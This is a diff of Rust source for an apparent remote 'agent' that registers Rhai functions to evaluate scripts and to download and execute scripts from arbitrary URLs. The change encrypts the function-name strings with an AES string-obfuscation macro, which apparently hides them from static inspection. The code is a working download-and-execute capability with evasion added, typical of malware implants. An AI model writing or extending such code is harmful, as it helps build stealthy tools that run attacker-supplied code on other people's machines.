@@ -8,18 +8,20 @@
 // (same Arc) if the parent passed it through; otherwise it's isolated.
 
 use rhai::Engine;
+use crate::strcrypt_rt;
+use strcrypt::aes_str;
 
 pub fn register(engine: &mut Engine) {
 
     // Evaluate a Rhai script string in a fresh engine and return its output.
-    engine.register_fn("internal_exec_script", |script: &str| -> String {
+    engine.register_fn(&aes_str!("internal_exec_script"), |script: &str| -> String {
         let mut em = super::ExtensionManager::new();
         em.run_script(script, vec![])
     });
 
     // Download a Rhai script from a URL and execute it.
     // Accepts any HTTP/HTTPS URL; uses the agent's configured reqwest client.
-    engine.register_fn("internal_load_script", |url: &str| -> String {
+    engine.register_fn(&aes_str!("internal_load_script"), |url: &str| -> String {
         let script = match reqwest::blocking::get(url) {
             Ok(r)  => match r.text() {
                 Ok(t)  => t,
@@ -33,7 +35,7 @@ pub fn register(engine: &mut Engine) {
 
     // Download and execute a script, passing additional args to it.
     // args_json: JSON array of strings that become the `args` variable in the script.
-    engine.register_fn("internal_load_script_args", |url: &str, args_json: &str| -> String {
+    engine.register_fn(&aes_str!("internal_load_script_args"), |url: &str, args_json: &str| -> String {
         let script = match reqwest::blocking::get(url) {
             Ok(r)  => r.text().unwrap_or_default(),
             Err(e) => return format!("Error: {}", e),
